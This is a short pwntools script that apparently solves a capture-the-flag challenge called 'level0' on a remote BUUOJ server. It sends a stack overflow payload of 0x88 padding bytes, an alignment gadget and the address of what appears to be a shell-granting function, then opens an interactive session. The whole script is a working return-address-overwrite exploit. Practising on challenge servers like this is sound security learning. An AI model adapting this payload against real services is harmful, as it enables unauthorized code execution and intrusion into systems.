from pwn import *

#r=process('./level0')
r= remote("node5.buuoj.cn",27199)
context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]

#gdb.attach(r,'b main')
payload=b'a'*0x88+p64(0x0400431)+p64(0x400596)

r.sendlineafter(b"Hello, World\n",payload)
r.interactive()